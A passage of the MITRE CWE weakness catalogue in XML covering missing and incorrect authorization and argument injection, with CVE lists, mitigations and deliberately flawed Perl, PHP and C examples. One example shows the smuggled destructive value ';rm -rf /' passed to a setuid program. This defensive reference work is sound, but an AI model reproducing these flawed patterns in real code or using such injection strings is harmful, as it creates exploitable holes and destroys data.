                  <xhtml:div>sub DisplayPrivateMessage {<xhtml:div style="margin-left:10px;">my($id) = @_;<xhtml:br/>my $Message = LookupMessageObject($id);<xhtml:br/>print "From: " . encodeHTML($Message-&gt;{from}) . "&lt;br&gt;\n";<xhtml:br/>print "Subject: " . encodeHTML($Message-&gt;{subject}) . "\n";<xhtml:br/>print "&lt;hr&gt;\n";<xhtml:br/>print "Body: " . encodeHTML($Message-&gt;{body}) . "\n";</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $q = new CGI;<xhtml:br/>
                     <xhtml:i># For purposes of this example, assume that CWE-309 and</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># CWE-523 do not apply.</xhtml:i>
                     <xhtml:br/>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:10px;">ExitError("invalid username or password");</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $id = $q-&gt;param('id');<xhtml:br/>DisplayPrivateMessage($id);</xhtml:div>
               </Example_Code>
               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-3168</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3597</Reference>
               <Description>Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2282</Reference>
               <Description>Terminal server does not check authorization for guest access.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5027</Reference>
               <Description>System monitoring software allows users to bypass authorization by creating custom forms.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5027</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3781</Reference>
               <Description>Content management system does not check access permissions for private files, allowing others to view those files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3781</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6548</Reference>
               <Description>Product does not check the ACL of a page accessed using an "include" directive, allowing attackers to read unauthorized files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6548</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2960</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3230</Reference>
               <Description>Database server does not use appropriate privileges for certain sensitive operations.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3230</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3424</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2925</Reference>
               <Description>Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2925</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3623</Reference>
               <Description>OS kernel does not check for a certain privilege before setting ACLs for files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1155</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
         </References>
         
      </Weakness>
      <Weakness ID="863" Name="Incorrect Authorization" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is also distinct from "AuthC," which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not correctly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. Even if they can be customized to recognize these schemes, they might not be able to tell whether the scheme correctly performs the authorization in a way that cannot be bypassed or subverted by an attacker.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may not be able to find interfaces that are protected by authorization checks, even if those checks contain weaknesses.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code could be for a medical records application. It displays a record to already authenticated users, confirming the user's authorization using a value stored in a cookie.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$role = $_COOKIES['role'];<xhtml:br/>if (!$role) {<xhtml:div style="margin-left:10px;">$role = getRole('user');<xhtml:br/>if ($role) {<xhtml:div style="margin-left:10px;">// save the cookie to send out in future responses<xhtml:br/>setcookie("role", $role, time()+60*60*2);</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:10px;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>}<xhtml:br/>if ($role == 'Reader') {<xhtml:div style="margin-left:10px;">DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:10px;">die("You are not Authorized to view this record\n");</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the cookie will only be set when getRole() succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie. However, the attacker can easily set the "role" cookie to the value "Reader". As a result, the $role variable is "Reader", and getRole() is never invoked. The attacker has bypassed the authorization system.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3424</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1155</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
         </References>
         
      </Weakness>
      <Weakness ID="88" Name="Argument Injection or Modification" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software does not sufficiently delimit the arguments being passed to a component in another control sphere, allowing alternate arguments to be provided, leading to potentially security-relevant changes.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="77" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Note>An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, request headers as well as content, URL components, e-mail, files, databases, and any external systems that provide data to the application. Perform input validation at well-defined interfaces.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-30">
               <Intro_Text>The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int main(int argc, char** argv) {<xhtml:div style="margin-left:10px;">char cmd[CMD_MAX] = "/usr/bin/cat ";<xhtml:br/>strcat(cmd, argv[1]);<xhtml:br/>system(cmd);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form ";rm -rf /", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.</Body_Text>
               <Body_Text>Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-0113</Reference>
               <Description>Canonical Example</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0113</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0150</Reference>
               <Description>Web browser executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0150</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0667</Reference>
               <Description>Web browser allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0667</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0985</Reference>
               <Description>Argument injection vulnerability in the mail function for PHP may allow attackers to bypass safe mode restrictions and modify command line arguments to the MTA (e.g. sendmail) possibly executing commands.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0985</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0907</Reference>
               <Description>Help and Support center in windows does not properly validate HCP URLs, which allows remote attackers to execute arbitrary code via quotation marks in an "hcp://" URL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0907</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0121</Reference>
               <Description>Mail client does not sufficiently filter parameters of mailto: URLs when using them as arguments to mail executable, which allows remote attackers to execute arbitrary programs.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0121</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0473</Reference>
               <Description>Web browser doesn't filter "-" when invoking various commands, allowing command-line switches to be specified.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0473</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0480</Reference>
               <Description>Mail client allows remote attackers to execute arbitrary code via a URI that uses a UNC network share pathname to provide an alternate configuration file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0480</Link>
            </Observed_Example>
